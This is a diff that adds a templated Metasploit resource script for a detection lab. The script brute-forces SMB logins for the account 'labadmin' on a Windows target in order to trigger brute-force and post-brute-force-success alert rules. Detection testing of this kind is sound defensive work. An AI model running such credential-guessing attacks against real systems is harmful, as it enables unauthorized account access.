@@ -1,0 +1,16 @@
+# Scenario: SMB credential brute force against the Windows target.
+# Exercises: 100020 (brute force via 4625), 100021 (success after brute force).
+#
+# Templated by msf_runner.py — {{TARGET}} and {{WORDLIST}} are substituted.
+# Wordlist should contain a handful of common/weak passwords; seed the
+# win-target lab account with one of them (e.g. "Summer2024!") so the
+# brute force eventually succeeds and you can see rule 100021 fire.
+
+use auxiliary/scanner/smb/smb_login
+set RHOSTS {{TARGET}}
+set SMBUser labadmin
+set PASS_FILE {{WORDLIST}}
+set STOP_ON_SUCCESS true
+set THREADS 4
+run
+exit -y
